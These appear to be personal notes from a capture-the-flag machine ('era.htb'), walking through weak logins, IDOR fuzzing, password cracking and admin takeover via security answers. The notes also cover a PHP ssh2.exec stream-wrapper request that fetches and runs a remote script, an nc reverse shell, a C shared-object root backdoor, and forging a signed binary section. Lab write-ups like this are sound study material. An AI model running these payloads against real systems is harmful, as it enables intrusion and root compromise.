___


# User

nginx 1.18.0 old version on port 80

vsftpd on port 21 need creds -> maybe hydra??


found subdomain -> file.


I logged in with test:test on the first try like no way

*login pass*
test:test

*things to try*
-could try to access another account
-?id=FUZZ: fuzz those user input parameters
-fuzz dirs more try to find file, even though /file/ i get access denied <- no results here
-run dirsearch with cookies <- nothing new
-try the test user on vsftpd <-files here <- running hydra so far nothing
-try anon login on vsftpd <- no results here
-try to come up with users from era.htb


*need to find a way to run that .php rev shell*


fuzzed /downloads.php?id=FUZZ

got 2 zip files a username, a key

try to log in with vsftpd


*these 2 passes so far* 
america          (?)
mustang          (?)


*got creds*

*for vsftpd*
yuri:mustang

*for website*
eric:america
yuri:mustang



*things to try*
can I access other things on the website with either yuri or eric??? -> doesn't seem so
I can only read from ftp, is there anything interesting on that /build?? doesnt' look like it 
what abt that private key from yuri wtf is that for
-maybe reset or manage files check what the post req is <- doesn't seem I can do som


*these look like the answer for the security login*
1|admin_ef01cab31aa|$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC|600|Maria|Oliver|Ottawa



sqlite> pragma table_info("users")
   ...> ;
0|user_id|INTEGER|0||1
1|user_name|varchar(255)|1||0
2|user_password|varchar(255)|1||0
3|auto_delete_files_after|INT|1||0
4|security_answer1|varchar(255)|0||0
5|security_answer2|varchar(255)|0||0
6|security_answer3|varchar(255)|0||0



*they didnt' work but logged in as another user u can change them and then log in as admin*



*can log in as admin now what???* -< I see those same 2 files


*register.php file in using query() method for sql


query is insecure -> prepare() should be used as it makes parameterized queries that are not vulnerable to sql injection


so essentially that form is vulnerable to sql injection if I can bypass the user input filters


https://bugbase.ai/blog/top-10-exploits-in-php-applications-and-how-to-exploit-them



## Insecure Direct Object References (IDOR)

when i fuzzed the ?id=FUZZ and found file would b IDOR ptty sure



*php stream wrapper*

ssh2.exec://eric:america@127.0.0.1/curl+-s+http://10.10.14.20:9999/cool.sh+|+sh


*full format then got shell*
GET /download.php?id=150&dl=false&show=true&format=ssh2.exec://eric:america@127.0.0.1/curl+-s+http://10.10.14.20:9999/cool.sh|sh;+


*shell from revshells*
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.20 8888 >/tmp/f



*the file in /opt/AV/monitor runs as root can do a shared object injection*

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void func() __attribute__ ((constructor));

static void func() {
   setuid(0); // 0 uid is for root
   system("nc -e /bin/bash 10.10.14.20 7777");
}

*compilation*
gcc -shared -fPIC -Wall -o /desired/path/to/library.so library.c
gcc -shared -fPIC -Wall -o ld-linux-x86-64.so.2 test.c



strace ./monitor 2>&1 | grep -iE 'open|access|no such file'




*dumped processes with pspy*


2025/08/05 05:42:01 CMD: UID=0    PID=111919 | bash -c echo > /opt/AV/periodic-checks/status.log 
2025/08/05 05:42:01 CMD: UID=0    PID=111918 | /bin/sh -c bash -c 'echo > /opt/AV/periodic-checks/status.log' 
2025/08/05 05:42:01 CMD: UID=0    PID=111921 | bash -c /root/initiate_monitoring.sh 
2025/08/05 05:42:01 CMD: UID=0    PID=111920 | /bin/sh -c bash -c '/root/initiate_monitoring.sh' >> /opt/AV/periodic-checks/status.log 2>&1 
2025/08/05 05:42:01 CMD: UID=0    PID=111922 | objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor 
2025/08/05 05:42:01 CMD: UID=0    PID=111924 | openssl asn1parse -inform DER -in text_sig_section.bin 
2025/08/05 05:42:01 CMD: UID=0    PID=111923 | /bin/bash /root/initiate_monitoring.sh 
2025/08/05 05:42:01 CMD: UID=0    PID=111927 | grep -oP (?<=UTF8STRING        :)Era Inc. 
2025/08/05 05:42:01 CMD: UID=0    PID=111925 | /bin/bash /root/initiate_monitoring.sh 
2025/08/05 05:42:01 CMD: UID=0    PID=111930 | grep -oP (?<=IA5STRING         :)yurivich@era.com 
2025/08/05 05:42:01 CMD: UID=0    PID=111928 | /bin/bash /root/initiate_monitoring.sh 
2025/08/05 05:42:01 CMD: UID=0    PID=111931 | /opt/AV/periodic-checks/monitor 
2025/08/05 05:42:28 CMD: UID=0    PID=111938 | 



*I have the priv key and cert from earlier from yuri*




*I think this is it*

openssl smime -sign \
  -binary \
  -noattr \
  -nocerts \
  -in a.out \
  -signer cert.pem \
  -inkey key.pem \
  -outform DER \
  -out text_sig_section.bin


*then this*
objcopy --add-section .text_sig=text_sig_section.bin a.out monitor.wurk



*finally worked got root*


